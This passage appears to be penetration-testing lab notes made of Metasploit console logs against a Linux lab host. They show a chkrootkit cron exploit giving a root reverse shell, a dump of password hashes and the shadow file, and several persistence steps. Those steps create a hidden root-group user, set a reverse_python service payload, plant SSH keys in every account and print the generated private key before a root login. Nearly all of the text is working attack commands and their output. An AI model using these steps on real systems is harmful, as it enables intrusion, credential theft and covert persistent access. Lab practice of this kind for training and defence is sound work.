[*] Started reverse TCP double handler on 192.100.135.2:4444
[!] Rooting depends on the crontab (this could take a while)
[*] Payload written to /tmp/update
[*] Waiting for chkrootkit to run via cron...

[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo AUzANgEsANx7EhGR;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "AUzANgEsANx7EhGR\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 3 opened (192.100.135.2:4444 -> 192.100.135.3:43674) at 2024-02-13 00:30:14 +0000
[+] Deleted /tmp/update

whoami
root
ls
flag
cat flag
9db8bf8f483ff50857f26f9bd636bed6
```

```bash
msf5 > use post/linux/gather/hashdump
msf5 post(linux/gather/hashdump) > options

Module options (post/linux/gather/hashdump):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  2                yes       The session to run this module on.

msf5 post(linux/gather/hashdump) > run

[+] root:$6$CoRDWfWE$g9xq7JcoOXk5qrI2sBLNFE1oZmCmzo/LYSrZlW.jsqMijFPJydYyuXXcTtx.o5Uh1cOVsa5.Jl8xpg3gYZDPB1:0:0:root:/root:/bin/bash
[+] test:$6$B7NYoPiI$ReS8Q1zXqkCJBMVW/7dPqi9yf/VSYbaKS6H.vBfNhCzLje1UmcTRNuWIghVBsEsVfvJfqg7otaB7FV6DH/Xjf.:1000:1000::/home/test:/bin/bash
[+] Unshadowed Password File: /root/.msf4/loot/20240213122716_hashdump_192.199.147.3_linux.hashes_556361.txt
[*] Post module execution completed
msf5 post(linux/gather/hashdump) > loot

Loot
====

host           service  type          name                   content     info                            path
----           -------  ----          ----                   -------     ----                            ----
192.199.147.3           linux.shadow  shadow.tx              text/plain  Linux Password Shadow File      /root/.msf4/loot/20240213122716_hashdump_192.199.147.3_linux.shadow_283202.txt
192.199.147.3           linux.passwd  passwd.tx              text/plain  Linux Passwd File               /root/.msf4/loot/20240213122716_hashdump_192.199.147.3_linux.passwd_246509.txt
192.199.147.3           linux.hashes  unshadowed_passwd.pwd  text/plain  Linux Unshadowed Password File  /root/.msf4/loot/20240213122716_hashdump_192.199.147.3_linux.hashes_556361.txt

msf5 post(linux/gather/hashdump) > cat /root/.msf4/loot/20240213122716_hashdump_192.199.147.3_linux.passwd_246509.txt
[*] exec: cat /root/.msf4/loot/20240213122716_hashdump_192.199.147.3_linux.passwd_246509.txt

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
messagebus:x:104:107::/var/run/dbus:/bin/false
colord:x:105:112:colord colour management daemon,,,:/var/lib/colord:/bin/false
saned:x:106:113::/var/lib/saned:/bin/false
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
test:x:1000:1000::/home/test:/bin/bash
msf5 post(linux/gather/hashdump) > cat /root/.msf4/loot/20240213122716_hashdump_192.199.147.3_linux.shadow_283202.txt
[*] exec: cat /root/.msf4/loot/20240213122716_hashdump_192.199.147.3_linux.shadow_283202.txt

root:$6$CoRDWfWE$g9xq7JcoOXk5qrI2sBLNFE1oZmCmzo/LYSrZlW.jsqMijFPJydYyuXXcTtx.o5Uh1cOVsa5.Jl8xpg3gYZDPB1:19766:0:99999:7:::
daemon:*:17774:0:99999:7:::
bin:*:17774:0:99999:7:::
sys:*:17774:0:99999:7:::
sync:*:17774:0:99999:7:::
games:*:17774:0:99999:7:::
man:*:17774:0:99999:7:::
lp:*:17774:0:99999:7:::
mail:*:17774:0:99999:7:::
news:*:17774:0:99999:7:::
uucp:*:17774:0:99999:7:::
proxy:*:17774:0:99999:7:::
www-data:*:17774:0:99999:7:::
backup:*:17774:0:99999:7:::
list:*:17774:0:99999:7:::
irc:*:17774:0:99999:7:::
gnats:*:17774:0:99999:7:::
nobody:*:17774:0:99999:7:::
systemd-timesync:*:17774:0:99999:7:::
systemd-network:*:17774:0:99999:7:::
systemd-resolve:*:17774:0:99999:7:::
systemd-bus-proxy:*:17774:0:99999:7:::
messagebus:*:17812:0:99999:7:::
colord:*:17812:0:99999:7:::
saned:*:17812:0:99999:7:::
usbmux:*:17812:0:99999:7:::
test:$6$B7NYoPiI$ReS8Q1zXqkCJBMVW/7dPqi9yf/VSYbaKS6H.vBfNhCzLje1UmcTRNuWIghVBsEsVfvJfqg7otaB7FV6DH/Xjf.:19766:0:99999:7:::
msf5 post(linux/gather/hashdump) > cat /root/.msf4/loot/20240213122716_hashdump_192.199.147.3_linux.hashes_556361.txt
[*] exec: cat /root/.msf4/loot/20240213122716_hashdump_192.199.147.3_linux.hashes_556361.txt

root:$6$CoRDWfWE$g9xq7JcoOXk5qrI2sBLNFE1oZmCmzo/LYSrZlW.jsqMijFPJydYyuXXcTtx.o5Uh1cOVsa5.Jl8xpg3gYZDPB1:0:0:root:/root:/bin/bash
test:$6$B7NYoPiI$ReS8Q1zXqkCJBMVW/7dPqi9yf/VSYbaKS6H.vBfNhCzLje1UmcTRNuWIghVBsEsVfvJfqg7otaB7FV6DH/Xjf.:1000:1000::/home/test:/bin/bash
msf5 post(linux/gather/hashdump) >
```

### Linux Persistence
```bash
msf5 exploit(unix/local/chkrootkit) > search platform:linux persistence

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  exploit/linux/local/apt_package_manager_persistence  1999-03-09       excellent  No     APT Package Manager Persistence
   1  exploit/linux/local/autostart_persistence            2006-02-13       excellent  No     Autostart Desktop Item Persistence
   2  exploit/linux/local/bash_profile_persistence         1989-06-08       normal     No     Bash Profile Persistence
   3  exploit/linux/local/cron_persistence                 1979-07-01       excellent  No     Cron Persistence
   4  exploit/linux/local/rc_local_persistence             1980-10-01       excellent  No     rc.local Persistence
   5  exploit/linux/local/service_persistence              1983-01-01       excellent  No     Service Persistence
   6  exploit/linux/local/yum_package_manager_persistence  2003-12-17       excellent  No     Yum Package Manager Persistence
   7  post/linux/manage/sshkey_persistence                                  excellent  No     SSH Key Persistence
```

Create a user on the machine

```bash
msf5 exploit(unix/local/chkrootkit) > sessions 4
[*] Starting interaction with 4...

meterpreter > shell
Process 5034 created.
Channel 1 created.
bash -i
bash: cannot set terminal process group (26): Inappropriate ioctl for device
bash: no job control in this shell

root@victim-1:~# useradd -m ftp -s /bin/bash
useradd -m ftp -s /bin/bash

root@victim-1:~# passwd ftp
passwd ftp
Enter new UNIX password: 123456
Retype new UNIX password: 123456
passwd: password updated successfully

root@victim-1:~# usermod -aG root ftp
usermod -aG root ftp

root@victim-1:~# groups ftp
groups ftp
ftp : ftp root

root@victim-1:~# usermod -u15 ftp
usermod -u15 ftp
root@victim-1:~# cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
messagebus:x:103:105::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
jackie:x:1000:1000:,,,:/home/jackie:/bin/bash
ftp:x:15:1001::/home/ftp:/bin/bash
```

```bash
msf5 exploit(linux/local/cron_persistence) > use exploit/linux/local/service_persistence
msf5 exploit(linux/local/service_persistence) > options

Module options (exploit/linux/local/service_persistence):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   SERVICE                      no        Name of service to create
   SESSION     4                yes       The session to run this module on.
   SHELLPATH   /usr/local/bin   yes       Writable path to put our shell
   SHELL_NAME                   no        Name of shell file to write


Exploit target:

   Id  Name
   --  ----
   0   Auto


msf5 exploit(linux/local/service_persistence) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                                                   Connection
  --  ----  ----                   -----------                                                                   ----------
  1         shell unknown          SSH jackie:password (192.194.37.3:22)                                         192.194.37.2:39557 -> 192.194.37.3:22 (192.194.37.3)
  2         meterpreter x86/linux  no-user @ victim-1 (uid=1000, gid=1000, euid=1000, egid=1000) @ 192.194.37.3  192.194.37.2:4433 -> 192.194.37.3:51954 (192.194.37.3)
  3         shell cmd/unix                                                                                       192.194.37.2:4444 -> 192.194.37.3:38814 (192.194.37.3)
  4         meterpreter x86/linux  no-user @ victim-1 (uid=0, gid=0, euid=0, egid=0) @ 192.194.37.3              192.194.37.2:4433 -> 192.194.37.3:60212 (192.194.37.3)

msf5 exploit(linux/local/service_persistence) > run

[-] Exploit failed: A payload has not been selected.
[*] Exploit completed, but no session was created.
msf5 exploit(linux/local/service_persistence) > set payload cmd/unix/reverse_python
set payload cmd/unix/reverse_python      set payload cmd/unix/reverse_python_ssl
msf5 exploit(linux/local/service_persistence) > set payload cmd/unix/reverse_python
payload => cmd/unix/reverse_python
msf5 exploit(linux/local/service_persistence) > iptins
[-] Unknown command: iptins.
msf5 exploit(linux/local/service_persistence) > options

Module options (exploit/linux/local/service_persistence):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   SERVICE                      no        Name of service to create
   SESSION     4                yes       The session to run this module on.
   SHELLPATH   /usr/local/bin   yes       Writable path to put our shell
   SHELL_NAME                   no        Name of shell file to write


Payload options (cmd/unix/reverse_python):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
   SHELL  /bin/bash        yes       The system shell to use.


Exploit target:

   Id  Name
   --  ----
   0   Auto


msf5 exploit(linux/local/service_persistence) > set LHOST 192.194.37.2
LHOST => 192.194.37.2
msf5 exploit(linux/local/service_persistence) > set LPORT 4422
LPORT => 4422
msf5 exploit(linux/local/service_persistence) > options

Module options (exploit/linux/local/service_persistence):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   SERVICE                      no        Name of service to create
   SESSION     4                yes       The session to run this module on.
   SHELLPATH   /usr/local/bin   yes       Writable path to put our shell
   SHELL_NAME                   no        Name of shell file to write


Payload options (cmd/unix/reverse_python):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.194.37.2     yes       The listen address (an interface may be specified)
   LPORT  4422             yes       The listen port
   SHELL  /bin/bash        yes       The system shell to use.


Exploit target:

   Id  Name
   --  ----
   0   Auto


msf5 exploit(linux/local/service_persistence) > run

[!] SESSION may not be compatible with this module.
[*] Started reverse TCP handler on 192.194.37.2:4422
[*] Utilizing systemd
[*] Utilizing Upstart
[-] Exploit failed: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: 1
[*] Exploit completed, but no session was created.
msf5 exploit(linux/local/service_persistence) > info

       Name: Service Persistence
     Module: exploit/linux/local/service_persistence
   Platform: Unix, Linux
       Arch: cmd
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 1983-01-01

Provided by:
  h00die <mike@shorebreaksecurity.com>
  Cale Black

Available targets:
  Id  Name
  --  ----
  0   Auto
  1   System V
  2   Upstart
  3   systemd
  4   systemd user

Check supported:
  No

Basic options:
  Name        Current Setting  Required  Description
  ----        ---------------  --------  -----------
  SERVICE                      no        Name of service to create
  SESSION     4                yes       The session to run this module on.
  SHELLPATH   /usr/local/bin   yes       Writable path to put our shell
  SHELL_NAME                   no        Name of shell file to write

Payload information:

Description:
  This module will create a service on the box, and mark it for
  auto-restart. We need enough access to write service files and
  potentially restart services Targets: System V: CentOS <= 5 Debian
  <= 6 Kali 2.0 Ubuntu <= 9.04 Upstart: CentOS 6 Fedora >= 9, < 15
  Ubuntu >= 9.10, <= 14.10 systemd: CentOS 7 Debian >= 7, <=8 Fedora
  >= 15 Ubuntu >= 15.04 Note: System V won't restart the service if it
  dies, only an init change (reboot etc) will restart it.

References:
  https://www.digitalocean.com/community/tutorials/how-to-configure-a-linux-service-to-start-automatically-after-a-crash-or-reboot-part-1-practical-examples
```

```bash
msf5 exploit(linux/local/service_persistence) > use post/linux/manage/sshkey_persistence
msf5 post(linux/manage/sshkey_persistence) > options

Module options (post/linux/manage/sshkey_persistence):

   Name             Current Setting       Required  Description
   ----             ---------------       --------  -----------
   CREATESSHFOLDER  false                 yes       If no .ssh folder is found, create it for a user
   PUBKEY                                 no        Public Key File to use. (Default: Create a new one)
   SESSION          4                     yes       The session to run this module on.
   SSHD_CONFIG      /etc/ssh/sshd_config  yes       sshd_config file
   USERNAME                               no        User to add SSH key to (Default: all users on box)

msf5 post(linux/manage/sshkey_persistence) > set CREATESSHFOLDER true
CREATESSHFOLDER => true
msf5 post(linux/manage/sshkey_persistence) > run

[*] Checking SSH Permissions
[*] Authorized Keys File: .ssh/authorized_keys
[*] Finding .ssh directories
[*] Creating /bin/.ssh folder
[*] Creating /dev/.ssh folder
[*] Creating /home/ftp/.ssh folder
[*] Creating /home/ftp
/.ssh folder
[*] Creating /home/jackie/.ssh folder
[*] Creating /nonexistent/.ssh folder
[*] Creating /root/.ssh folder
[*] Creating /run/sshd/.ssh folder
[*] Creating /run/systemd/netif/.ssh folder
[*] Creating /run/systemd/resolve/.ssh folder
[*] Creating /usr/games/.ssh folder
[*] Creating /usr/sbin/.ssh folder
[*] Creating /var/backups/.ssh folder
[*] Creating /var/cache/man/.ssh folder
[*] Creating /var/lib/gnats/.ssh folder
[*] Creating /var/list/.ssh folder
[*] Creating /var/mail/.ssh folder
[*] Creating /var/run/ircd/.ssh folder
[*] Creating /var/spool/lpd/.ssh folder
[*] Creating /var/spool/news/.ssh folder
[*] Creating /var/spool/uucp/.ssh folder
[*] Creating /var/www/.ssh folder
[+] Storing new private key as /root/.msf4/loot/20240213130215_persistence_192.194.37.3_id_rsa_306905.txt
[*] Adding key to /bin/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /dev/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /home/ftp/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /home/jackie/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /nonexistent/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /root/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /run/sshd/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /run/systemd/netif/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /run/systemd/resolve/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /usr/games/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /usr/sbin/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /var/backups/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /var/cache/man/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /var/lib/gnats/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /var/list/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /var/mail/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /var/run/ircd/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /var/spool/lpd/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /var/spool/news/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /var/spool/uucp/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /var/www/.ssh/authorized_keys
[+] Key Added
[*] Post module execution completed

msf5 post(linux/manage/sshkey_persistence) > loot

Loot
====

host          service  type    name        content     info                      path
----          -------  ----    ----        -------     ----                      ----
192.194.37.3           id_rsa  ssh_id_rsa  text/plain  OpenSSH Private Key File  /root/.msf4/loot/20240213130215_persistence_192.194.37.3_id_rsa_306905.txt

msf5 post(linux/manage/sshkey_persistence) > cat /root/.msf4/loot/20240213130215_persistence_192.194.37.3_id_rsa_306905.txt
[*] exec: cat /root/.msf4/loot/20240213130215_persistence_192.194.37.3_id_rsa_306905.txt

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA0J7o2fsfKbrfIUlp0p1W/rmObLuHloZWpbMTp5WmvY0gp6Wp
42wySZ7azKvJgy0cFwxjr+vKlbKzIFaHW17Khu7FllAL4vYWDezFybX+rNjABOD5
GW9UtntXD3H/g+hE6LxsCOy5KI/MiXwIxyCN9pXpKcyvldeP2zEAmBB3PD2HPY5I
2iNYOd3azc54u2i0PB18Ia2wlhzsLC1jAAM0ro9UG4/CzR2EU1y0YsQaZagghqbJ
9XJM4QKr13xsQrAgAkF9zBfen4apXOjyNp43Vn4wbE/NzhTgWPbhhDz25Iv8aDxA
/6hHlz3OnD11dw+JVj7l0EunvZdAe8MeBmctfQIDAQABAoIBAQCHhuSAT5pkEqlH
x5h+oYZVfpge3QjtaaI6jQZ0tUyYEWmoX3/pZW2Z1CASHHuRwylfc8YDECwQagHi
PTQ70G3DkLQ9vQyryfBz5WBsdNXY1gqQYNKSine/AIuDViyHNcomY9nPRnHW/uwC
WNie+/AdxC+v3vAmaN5kqAXZw8CiGa4t+AB6UKb3Pm1qqtmG/jdxXU1Ei1lYK7ys
jrh0cKxuYZXUxMcRUAFsYFd6blMT2O+3S+nZiVFvTge3FkqsSp3bPaV3x1wfX2+F
NRqkxQ3NkKXNXtc9/svZz1BJFiadrqrol+pAHfPv1tnFN+fxq1x1tbaJ2ZZjs1EH
0hAUQZ/FAoGBAO43+PkuXtDf/X5huyFzH+aEDcbDZKny4oKPL2M6VKIEklvVy/Uw
Ab04If3ABog0F1quZV0WROgESkzUzVySKI2OWEbdAnq3io2yvdKyRYXK/SgWk0i0
iyMSviKAnmDP39hKZ6pIIvFoGCcpFJrxmNFEYi1N9U6DHxYJU79OoX2DAoGBAOAx
XLoajg/gARRQjw/EAfsWx0RcyMoBmCxEhxsIpy2DrgTX6UO/vIjjbk4dUKZm6Xvq
Hbzb4yJ2u3e5Djw2M3ZluTcX/Y/IuGQnEKYtUsRyIgCPYmgZtlHvHhceeHXK2aGa
xJVSWi5+gDeOFl5w+dR2XG8ChRqDDZgulCVGR7j/AoGAKRIHX9apzDNB/h8VZz/0
+QY9Zc5cNZzFhqLvFZmB6+kD3sdugZhERH5ABgKsXaE1gZHdsf3b5XCP6s0pltMw
IK+w8o66FbQ9NA7kAUZxDA8iNF4oCHnwHxzlIQexxpkwS5cQZmBHff1nZKEFh20t
3q5+ircNGvsqSd9TzADfgMcCgYEA3Z7OTEZN4tGMH5nXIj2fu6dzyldyQYa7+B6x
8/5kzLBcCPuq4scaR7OTafK+tBANhOoVBYnUiVAX16z+rnTiAItkQVsc09MWvCKF
6c/p/rnYdPdIzyGDwpD/DNmZONASvRbyd63V6hoxAzoZULibrvRmQXKbQ28DtElv
Nz23Tt8CgYApWOie4yKeMQ5vuViNXi29vwMxQcqVfy+gpEuF3y/o0RQzyfUwg0MZ
Mq18wL0WAyNBvkozzVEkoiIbhxW+SvUpOQKtpISQQ+tGpihnkpgr9zwwKzDggtix
dJQSAiwZPZFXYkKT+qhL+6KwTI8Qj3ukmvFIOWnmSOSYGyHlb23n+Q==
-----END RSA PRIVATE KEY-----


msf5 post(linux/manage/sshkey_persistence) > exit -y

root@attackdefense:~# vim ssh_key

root@attackdefense:~# chmod 600 ssh_key

root@attackdefense:~# ssh -i ssh_key root@192.194.37.3
The authenticity of host '192.194.37.3 (192.194.37.3)' can't be established.
ECDSA key fingerprint is SHA256:oqLzK4Uz72ljNbol98v3RyT8BJDLVMAZql/uLIsuonI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.194.37.3' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 5.4.0-152-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

-bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
root@victim-1:~#
```
